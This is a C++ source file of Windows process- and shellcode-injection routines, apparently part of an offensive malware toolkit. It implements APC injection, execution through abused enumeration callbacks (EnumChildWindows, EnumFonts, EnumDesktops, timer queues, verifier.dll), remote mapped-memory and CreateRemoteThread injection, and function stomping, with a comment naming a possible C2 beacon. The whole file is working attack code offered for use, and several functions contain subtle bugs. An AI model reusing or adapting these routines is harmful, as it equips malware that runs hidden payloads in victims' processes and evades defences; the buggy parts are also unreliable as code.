#include "dllinjection.h"

BOOLEAN InjectPayloadQueueUserAPC
(
	IN     HANDLE hThread,
	IN     PBYTE  pPayloadAddress,
	IN	   SIZE_T sPayloadSize
)
{
	if (sPayloadSize == NULL || hThread == INVALID_HANDLE_VALUE || hThread == nullptr || pPayloadAddress == nullptr) return FALSE;

	PVOID pLocalPayloadAddress = nullptr;
	DWORD dwOldProtections	   = NULL;

	if ((pLocalPayloadAddress = VirtualAlloc(nullptr, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == nullptr) return FALSE;

	if (memcpy(pLocalPayloadAddress, pPayloadAddress, sPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayloadAddress, sPayloadSize, PAGE_EXECUTE ,&dwOldProtections) == FALSE) return FALSE;

	if (QueueUserAPC(reinterpret_cast<PAPCFUNC>(pLocalPayloadAddress), hThread, 0) == NULL) return FALSE;
	
	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumChildWindows
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL || pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE) return FALSE;

	if (EnumChildWindows(nullptr, reinterpret_cast<WNDENUMPROC>(pLocalPayload), NULL) == FALSE) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumDesktops
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (sPayloadSize == NULL || pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(pPayload, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload  == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, sPayloadSize) == nullptr) return FALSE;

	EnumDesktopsW(GetProcessWindowStation(), reinterpret_cast<DESKTOPENUMPROCW>(pLocalPayload), NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumFonts
(
	IN     LPVOID  lpPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL || pdwOldProtections == nullptr || lpPayload == nullptr|| pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload == nullptr) return FALSE;

	if (memcpy(pLocalPayload, lpPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) ==  FALSE)return FALSE;

	EnumFontsW( GetDC(nullptr), nullptr, reinterpret_cast<FONTENUMPROCW>(pLocalPayload), NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumUILanguagesW
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL|| pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload  == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE)return FALSE;

	if (EnumUILanguagesW(reinterpret_cast<UILANGUAGE_ENUMPROCW>(pLocalPayload), MUI_LANGUAGE_NAME, NULL) == FALSE) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumThreadWindows
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL || pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE)return FALSE;

	if (EnumThreadWindows(NULL, reinterpret_cast<WNDENUMPROC>(pLocalPayload), NULL) == FALSE) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PHANDLE phTimerHandle,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL || phTimerHandle == nullptr || pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload == nullptr)  return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE)return FALSE;

	if (CreateTimerQueueTimer(phTimerHandle,nullptr,reinterpret_cast<WAITORTIMERCALLBACK>(pLocalPayload),nullptr,NULL,NULL,NULL) == FALSE) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumDisplayMonitors
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL || pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	PBYTE pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pLocalPayload == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE) return FALSE;

	EnumDisplayMonitors(nullptr, nullptr, reinterpret_cast<MONITORENUMPROC>(pLocalPayload), NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadVerEnumResource
(
	IN     LPVOID  pPayload,
	IN     DWORD   dwPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (dwPayloadSize == NULL|| pdwOldProtections == nullptr || pPayload == nullptr || pInjectedPayloadAddress == nullptr) return FALSE;

	fnVerifierEnumerateResource pVerifierEnumerateResource = nullptr;
	PBYTE						pLocalPayload			   = nullptr;
	HMODULE						hModule					   = LoadLibraryA("verifier.dll");

	if (hModule == nullptr) return FALSE;

	if ((pLocalPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;

	if (memcpy(pLocalPayload, pPayload, dwPayloadSize) == nullptr) return FALSE;

	if (VirtualProtect(pLocalPayload, dwPayloadSize, PAGE_EXECUTE, pdwOldProtections) == FALSE) return FALSE;

	if ((pVerifierEnumerateResource = reinterpret_cast<fnVerifierEnumerateResource>(GetProcessAddressReplacement(hModule, const_cast<LPSTR>("VerifierEnumerateResource")))) == nullptr) return FALSE;

	if (pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, reinterpret_cast<AVRF_RESOURCE_ENUMERATE_CALLBACK>(pLocalPayload), nullptr) == FALSE)return FALSE;

	if (EnumUILanguagesW(reinterpret_cast<UILANGUAGE_ENUMPROCW>(pLocalPayload), MUI_LANGUAGE_NAME, NULL)) return FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectPayloadRemoteMappedMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR* pRemoteMappedAddress,
	   OUT PUCHAR* pLocalMappedAddress,
	IN	   SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteFileMappingHandle,
	IN     HANDLE  hProcess
)
{
	if (pPayload == nullptr || pRemoteMappedAddress == nullptr || sPayloadSize == NULL || phRemoteFileMappingHandle == nullptr || pRemoteMappedAddress == nullptr || pLocalMappedAddress == nullptr) return FALSE;


	PVOID  pMapLocalAddress  = nullptr,
		   pMapRemoteAddress = nullptr;
	HANDLE hFile			 = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, nullptr);

	if (hFile == nullptr) return FALSE;

	if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize)) == nullptr) return FALSE;

	memcpy_s(pMapLocalAddress, sPayloadSize, pPayload, sPayloadSize);

	if ((pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, nullptr, NULL, NULL, PAGE_EXECUTE_READWRITE)) == nullptr)  return FALSE;

	*pLocalMappedAddress = static_cast<PUCHAR>(pMapLocalAddress);

	*pRemoteMappedAddress = static_cast<PUCHAR>(pMapRemoteAddress);

	return TRUE;
}

BOOLEAN InjectPayloadRemoteProcess
(
	IN     HANDLE hProcessHandle,
	IN     PBYTE  pPayload,
	IN     SIZE_T sPayloadSize,
	   OUT PVOID *pExternalPayloadAddress
)
{
	SIZE_T  sBytesWritten	 = NULL;
	DWORD   dwOldProtections = NULL;
	BOOLEAN bState			 = FALSE;

	*pExternalPayloadAddress = VirtualAllocEx(hProcessHandle, nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (*pExternalPayloadAddress == nullptr) return FALSE;

	if (WriteProcessMemory(hProcessHandle, *pExternalPayloadAddress, pPayload,sPayloadSize, &sBytesWritten) == FALSE || sBytesWritten != sPayloadSize) goto EndOfFunc;

	if (VirtualProtectEx(hProcessHandle, *pExternalPayloadAddress, sPayloadSize, PAGE_EXECUTE, &dwOldProtections) == FALSE) goto EndOfFunc;

	bState = TRUE;

EndOfFunc:
	VirtualFreeEx(hProcessHandle, *pExternalPayloadAddress, sPayloadSize, MEM_FREE);

	return bState;
}

BOOL InjectRemoteDll //Input safeguards needed.
(
	IN     PVOID   pPayload,
	IN	   HANDLE  hProcess, 
	IN	   LPWSTR   TargetDllName,
	IN     LPSTR   TargetFunctionName,
	IN     SIZE_T  sSizeToWrite,
	   OUT PVOID  *pRemoteFunctionAddress
)
{
	SIZE_T BytesWritten			  = NULL;
	LPVOID pTargetFunctionAddress = nullptr;
	DWORD  dwOldProtections		  = NULL;

	*pRemoteFunctionAddress = reinterpret_cast<PVOID>(GetProcessAddressReplacement(LoadLibraryW(TargetDllName), TargetFunctionName));

	if (*pRemoteFunctionAddress == nullptr) return FALSE;

	if (VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_READWRITE, &dwOldProtections) == FALSE) return FALSE;

	if (WriteProcessMemory(hProcess, *pRemoteFunctionAddress, pPayload, sSizeToWrite, &BytesWritten) == FALSE || sSizeToWrite != BytesWritten)
	{
		printf("Failed to write process memory with ErrorCode: 0x%lx", GetLastError());

		return FALSE;
	}

	if (VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_EXECUTE_READWRITE, &dwOldProtections) == FALSE)

	wprintf(L"[i] Injected %s to the targeted process! Payload allocated At : 0x%p Of Size : %zu\n", TargetDllName, *pRemoteFunctionAddress, sSizeToWrite);

	return TRUE;
}

BOOL InjectPayloadToProcess
(
	IN     HANDLE  hTargetProcessHandle, 
	IN     PBYTE   pPayloadAddress, 
	IN     SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteThreadHandle
)
{
	if (hTargetProcessHandle == INVALID_HANDLE_VALUE  || hTargetProcessHandle == nullptr || pPayloadAddress == nullptr || sPayloadSize == NULL || phRemoteThreadHandle == nullptr) return FALSE;

	DWORD  dwOldProtection			= NULL;
	SIZE_T sBytesWritten			= NULL;
	LPVOID lpExternalPayloadAddress = VirtualAllocEx(hTargetProcessHandle, nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	if (lpExternalPayloadAddress == nullptr) return FALSE;

	if (WriteProcessMemory(hTargetProcessHandle, lpExternalPayloadAddress, pPayloadAddress, sPayloadSize, &sBytesWritten) == FALSE || sPayloadSize != sBytesWritten) return FALSE;

	if (VirtualProtectEx(hTargetProcessHandle, lpExternalPayloadAddress,sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection) == FALSE) return FALSE;

	*phRemoteThreadHandle = CreateRemoteThread(hTargetProcessHandle, nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(lpExternalPayloadAddress), nullptr, 0, nullptr);

	if (*phRemoteThreadHandle == nullptr || *phRemoteThreadHandle == INVALID_HANDLE_VALUE) return FALSE;

	return  TRUE;
}

BOOL StompLocalFunction
(
	IN     PVOID  pTargetFuncAddress,
	IN	   PBYTE  pPayload,
	IN     SIZE_T sPayloadSize
)
{
	if (pTargetFuncAddress == nullptr || pPayload == nullptr|| sPayloadSize == NULL) return FALSE;

	DWORD dwOldProtections = NULL;

	if (VirtualProtect(pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections) == FALSE) return FALSE;

	memcpy(pTargetFuncAddress, pPayload, sPayloadSize);

	if (VirtualProtect(pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections) == FALSE) return FALSE;

	return TRUE;
}  

BOOL StompRemoteFunction
(
	IN     PVOID  pTargetFuncAddress,
	IN     HANDLE hTargetProcess,
	IN	   PUCHAR pPayload,
	IN     SIZE_T sPayloadSize
)
{
	if (hTargetProcess == INVALID_HANDLE_VALUE ||  hTargetProcess == nullptr || pTargetFuncAddress == nullptr || pPayload == nullptr || sPayloadSize == NULL) return FALSE;

	DWORD dwOldProtections = NULL;
	SIZE_T sBytesWritten   = NULL;

	if (VirtualProtectEx(hTargetProcess, pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections) == FALSE) return FALSE;

	if (WriteProcessMemory(hTargetProcess, pTargetFuncAddress, pPayload, sPayloadSize, &sBytesWritten) == FALSE || sPayloadSize != sBytesWritten) return FALSE;

	if (VirtualProtectEx(hTargetProcess, pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections) == FALSE) return FALSE;

	return TRUE;
}